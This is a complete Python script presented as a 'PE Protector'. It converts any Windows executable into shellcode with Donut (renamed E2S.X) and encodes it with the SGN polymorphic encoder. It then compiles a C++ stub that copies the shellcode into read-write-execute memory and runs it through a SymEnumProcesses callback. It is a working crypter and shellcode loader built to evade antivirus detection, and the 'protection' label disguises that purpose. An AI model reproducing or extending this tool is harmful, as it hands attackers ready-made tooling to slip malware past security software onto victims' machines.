# Final Version

import subprocess
import os
import random
import sys
import argparse
import tempfile
import time
import threading
from colorama import init, Fore, Style

init(autoreset=True) # Initialize Colorama

# --- Configuration ---
UTILS_DIR = "./Utils/"
DEFAULT_DONUT_PATH = os.path.join(UTILS_DIR, "E2S.X")
DEFAULT_SGN_PATH = os.path.join(UTILS_DIR, "SGN.X")
DEFAULT_COMPILER_PATH = "cl.exe"

DONUT_ARGS = "-b 1 -e 1 -z 3"
SGN_ARGS_TEMPLATE = "-i \"{input_bin}\" -o \"{output_bin}\""
# Compiler flags optimized for size, static CRT, no console, required libs
# Corrected: Added /Fe:"{output_exe}" back
COMPILER_ARGS_TEMPLATE = '/nologo /O1 /GL /Gy /GS- /MT /EHsc /W3 /D "WIN32" /D "NDEBUG" /DEBUG:NONE /Fe:"{output_exe}" "{input_cpp}" /link /LTCG /OPT:REF /OPT:ICF /INCREMENTAL:NO /SUBSYSTEM:WINDOWS kernel32.lib user32.lib Dbghelp.lib'

# --- C++ Stub Template ---
CPP_STUB_TEMPLATE = """
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <DbgHelp.h>

// --- Encoded Shellcode ---
// Defined globally later, before WinMain
// --- SHELLCODE_ARRAY_DEFINITION_PLACEHOLDER ---
// XOR Key removed

// --- WinMain Implementation ---
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {{

    LPVOID execMem = nullptr;
    // Note: 'encodedShellcode' now refers to the direct output of SGN
    SIZE_T shellcodeSize = sizeof(encodedShellcode);
    BOOL success = FALSE;

    if (shellcodeSize > 0) {{
        execMem = VirtualAlloc( NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );
        if (execMem != NULL) {{
            // --- XOR DECODING LOOP REMOVED ---

            // Copy the SGN-encoded shellcode directly into executable memory
            unsigned char* bytePtr = (unsigned char*)execMem; // Destination
            const unsigned char* srcPtr = encodedShellcode; // Source (global array)
            for (SIZE_T i = 0; i < shellcodeSize; ++i) {{
                 bytePtr[i] = srcPtr[i]; // Direct copy
            }}
            // Alternative: Use RtlMoveMemory if preferred/needed
            // Ensure kernel32.lib is linked (which it is)
            // ::RtlMoveMemory(execMem, encodedShellcode, shellcodeSize);

            // Initialize DbgHelp directly
            if (SymInitialize(GetCurrentProcess(), NULL, FALSE)) {{
                // Execute shellcode via SymEnumProcesses callback directly
                SymEnumProcesses((PSYM_ENUMPROCESSES_CALLBACK)execMem, NULL);
                success = TRUE;
                // Optional cleanup, may not be reached if shellcode exits
                SymCleanup(GetCurrentProcess());
            }} else {{
                 success = FALSE;
                 // Free memory if SymInitialize failed before execution
                 VirtualFree(execMem, 0, MEM_RELEASE);
            }}
        }} else {{
             success = FALSE; // VirtualAlloc failed
        }}
    }} else {{
        success = FALSE; // shellcodeSize is zero
    }}
    return success ? 0 : 1;
}}
"""

# --- Console Output Helpers ---
def print_info(msg): print(f"{Fore.CYAN}[*]{Style.RESET_ALL} {msg}")
def print_success(msg): print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {msg}")
def print_warning(msg): print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} {msg}")
def print_error(msg): print(f"{Fore.RED}[-]{Style.RESET_ALL} {msg}")

# --- Spinner ---
spinner_stop_event = threading.Event()
spinner_thread = None

def spinner_func():
    chars = ['|', '/', '-', '\\']
    idx = 0
    while not spinner_stop_event.is_set():
        try:
            sys.stdout.write(f"\r{Fore.YELLOW}{Style.BRIGHT} {chars[idx % len(chars)]}{Style.RESET_ALL} Processing...")
            sys.stdout.flush()
            idx += 1
            time.sleep(0.1)
        except OSError:
            break
    # Use try-except for final clear in case console detached during sleep
    try:
        sys.stdout.write('\r' + ' ' * 30 + '\r')
        sys.stdout.flush()
    except OSError: pass


def start_spinner():
    global spinner_thread, spinner_stop_event
    if spinner_thread and spinner_thread.is_alive(): return
    spinner_stop_event.clear()
    spinner_thread = threading.Thread(target=spinner_func, daemon=True)
    spinner_thread.start()

def stop_spinner():
    global spinner_thread
    if spinner_thread and spinner_thread.is_alive():
        spinner_stop_event.set()
        spinner_thread.join(timeout=0.5)
    try:
        sys.stdout.write('\r' + ' ' * 30 + '\r')
        sys.stdout.flush()
    except OSError: pass
    spinner_thread = None

# --- Helper Functions ---

def run_command(command, shell=True, suppress_stdout=False, suppress_stderr=False):
    stdout_redir = subprocess.DEVNULL if suppress_stdout else None
    stderr_redir = subprocess.DEVNULL if suppress_stderr else None
    try:
        result = subprocess.run(command, shell=shell, check=True,
                                stdout=stdout_redir, stderr=stderr_redir,
                                text=True, encoding='utf-8', errors='ignore')
        return result
    except subprocess.CalledProcessError as e:
        raise # Let the calling context handle printing errors
    except FileNotFoundError:
        raise # Let the calling context handle printing errors
    except Exception as e:
        raise # Let the calling context handle printing errors

def generate_c_array(data):
    if not data: return ""
    hex_bytes = [f"0x{byte:02x}" for byte in data]
    formatted_string = ""
    for i, hex_byte in enumerate(hex_bytes):
        formatted_string += hex_byte + ", "
        if (i + 1) % 16 == 0: formatted_string += "\n    "
    return formatted_string.rstrip(', \n\t ')

def resolve_tool_path(tool_arg, default_path, tool_name):
    if tool_arg != default_path and os.path.isfile(tool_arg):
         return os.path.abspath(tool_arg)
    if os.path.isfile(default_path):
        return os.path.abspath(default_path)
    if not os.path.isabs(tool_arg):
         for path_dir in os.environ.get("PATH", "").split(os.pathsep):
             for ext in ["", ".exe"]:
                 potential_path = os.path.join(path_dir, os.path.basename(tool_arg) + ext)
                 if os.path.isfile(potential_path):
                     print_info(f"Resolved {tool_name} via PATH: {potential_path}")
                     return potential_path
    print_warning(f"{tool_name} executable '{tool_arg}' not found. Assuming it's accessible to the shell.")
    return tool_arg

def check_cl_environment():
    required_vars = ['INCLUDE', 'LIB', 'LIBPATH']
    missing_vars = [v for v in required_vars if not os.environ.get(v)]
    if missing_vars:
        print_warning(f"Dev env variables missing: {', '.join(missing_vars)}. Run from Dev Prompt.")
        return False
    print_info("Developer environment check passed.")
    return True

# --- Main Logic ---

def main():
    parser = argparse.ArgumentParser(description="PE Protector: Donut -> SGN -> Stub -> Compile")
    parser.add_argument("-i", "--input", required=True, help="Input executable (.exe).")
    parser.add_argument("-o", "--output", required=True, help="Output protected executable (.exe).")
    parser.add_argument("--donut", default=DEFAULT_DONUT_PATH, help=f"Path to Donut (E2S.X). Default: '{DEFAULT_DONUT_PATH}'")
    parser.add_argument("--sgn", default=DEFAULT_SGN_PATH, help=f"Path to SGN (SGN.X). Default: '{DEFAULT_SGN_PATH}'")
    parser.add_argument("--compiler", default=DEFAULT_COMPILER_PATH, help=f"C++ compiler (cl.exe). Default: '{DEFAULT_COMPILER_PATH}'")
    parser.add_argument("--keep-temp", action='store_true', help="Keep temporary files (.bin, .cpp).")

    args = parser.parse_args()

    print_info("Starting PE Protector...")

    check_cl_environment() # Warn user if not in dev prompt

    temp_dir = None
    tmp_donut_bin_path = None
    tmp_sgn_bin_path = None
    tmp_cpp_path = None
    start_time = time.time()

    try:
        if not os.path.isfile(args.input):
            print_error(f"Input file not found: {args.input}")
            sys.exit(1)

        donut_path = resolve_tool_path(args.donut, DEFAULT_DONUT_PATH, "Donut")
        sgn_path = resolve_tool_path(args.sgn, DEFAULT_SGN_PATH, "SGN")
        compiler_path = args.compiler

        input_exe_abs = os.path.abspath(args.input)
        output_exe_abs = os.path.abspath(args.output)

        temp_dir = tempfile.mkdtemp()
        tmp_donut_bin_path = os.path.join(temp_dir, "donut_shellcode.bin")
        tmp_sgn_bin_path = os.path.join(temp_dir, "sgn_encoded.bin")
        tmp_cpp_path = os.path.join(temp_dir, "stub.cpp")
        print_info(f"Using temp directory: {temp_dir}")

        # --- Step 1: Donut ---
        print_info("Running Donut (E2S.X)...")
        donut_cmd = f'"{donut_path}" -i "{input_exe_abs}" -o "{tmp_donut_bin_path}" {DONUT_ARGS}'
        start_spinner()
        try:
            run_command(donut_cmd, suppress_stdout=True, suppress_stderr=True)
        except Exception as e:
             stop_spinner()
             print_error(f"Donut execution failed. Check command and tool paths.")
             sys.exit(1)
        finally:
            stop_spinner()
        if not os.path.exists(tmp_donut_bin_path) or os.path.getsize(tmp_donut_bin_path) == 0:
             print_error(f"Donut failed to generate output: {tmp_donut_bin_path}")
             sys.exit(1)
        print_success("Donut processing complete.")

        # --- Step 2: SGN ---
        print_info("Running SGN...")
        sgn_cmd = f'"{sgn_path}" {SGN_ARGS_TEMPLATE.format(input_bin=tmp_donut_bin_path, output_bin=tmp_sgn_bin_path)}'
        start_spinner()
        try:
            run_command(sgn_cmd, suppress_stdout=True, suppress_stderr=True)
        except Exception as e:
             stop_spinner()
             print_error(f"SGN execution failed. Check command and tool paths.")
             sys.exit(1)
        finally:
            stop_spinner()
        if not os.path.exists(tmp_sgn_bin_path) or os.path.getsize(tmp_sgn_bin_path) == 0:
             print_error(f"SGN failed to generate output: {tmp_sgn_bin_path}")
             sys.exit(1)
        print_success("SGN processing complete.")

        # --- Step 3: Read SGN Output ---
        print_info("Reading SGN encoded shellcode...")
        try:
            with open(tmp_sgn_bin_path, "rb") as f:
                sgn_encoded_bytes = f.read()
            print_info(f"Read {len(sgn_encoded_bytes)} bytes.")
        except IOError as e:
            print_error(f"Cannot read SGN output {tmp_sgn_bin_path}: {e}")
            sys.exit(1)
        if not sgn_encoded_bytes:
            print_error("SGN output empty after reading.")
            sys.exit(1)

        # --- Step 4: Generate C++ Stub (No XOR) ---
        print_info("Step 4: Generating C++ stub...")
        cpp_shellcode_array = generate_c_array(sgn_encoded_bytes)
        cpp_shellcode_definition = f"unsigned char encodedShellcode[] = {{ {cpp_shellcode_array if cpp_shellcode_array else ''} }};"
        cpp_source = CPP_STUB_TEMPLATE
        cpp_source = cpp_source.replace("// --- SHELLCODE_ARRAY_DEFINITION_PLACEHOLDER ---", cpp_shellcode_definition)

        # --- Step 5: Write C++ Stub ---
        print_info("Step 5: Writing stub to file...")
        try:
            with open(tmp_cpp_path, 'w', encoding='utf-8') as f:
                f.write(cpp_source)
            print_info(f"Stub written to {tmp_cpp_path}")
        except IOError as e:
            print_error(f"Cannot write C++ stub file {tmp_cpp_path}: {e}")
            sys.exit(1)

        # --- Step 6: Compile ---
        print_info("Step 6: Compiling C++ stub...")
        compiler_cmd = f'"{compiler_path}" {COMPILER_ARGS_TEMPLATE.format(output_exe=output_exe_abs, input_cpp=tmp_cpp_path)}'
        start_spinner()
        try:
            run_command(compiler_cmd, suppress_stdout=True, suppress_stderr=True)
        except Exception as e:
             stop_spinner()
             print_error(f"Failed to compile C++ stub.")
             print_error(f"Compiler command was: {compiler_cmd}") # Show command on error
             args.keep_temp = True
             sys.exit(1)
        finally:
            stop_spinner()
        print_success("Compilation complete.")

        # --- Success ---
        end_time = time.time()
        print_success("-" * 40)
        print_success(f"Protected executable created successfully!")
        print_success(f"Output: {output_exe_abs}")
        print_success(f"Total time: {end_time - start_time:.2f} seconds")
        print_success("-" * 40)

    except SystemExit:
        print_warning("Operation aborted.")
    except Exception as e:
        stop_spinner() # Ensure spinner stops on unexpected error
        print_error(f"An unexpected critical error occurred: {e}")
        args.keep_temp = True
    finally:
        # --- Step 7: Cleanup ---
        if not args.keep_temp:
            print_info("Cleaning up temporary files...")
            removed_count = 0
            try:
                files_to_remove = [tmp_donut_bin_path, tmp_sgn_bin_path, tmp_cpp_path]
                for f_path in files_to_remove:
                    if f_path and os.path.exists(f_path):
                        try: os.remove(f_path); removed_count += 1
                        except OSError as e: print_warning(f"Failed to remove {f_path}: {e}")
                if temp_dir and os.path.exists(temp_dir):
                     try:
                         if not os.listdir(temp_dir): os.rmdir(temp_dir); print_info("Removed temporary directory.")
                         else: print_warning(f"Temp directory not empty, not removing: {temp_dir}")
                     except OSError as e: print_warning(f"Failed to remove dir {temp_dir}: {e}")
                if removed_count > 0: print_info(f"Removed {removed_count} file(s).")
            except Exception as e: print_warning(f"Error during cleanup: {e}")
        else:
             if temp_dir and os.path.exists(temp_dir): print_info(f"Temporary files kept in: {temp_dir}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        stop_spinner()
        print_warning("\nOperation interrupted by user.")
        sys.exit(1)
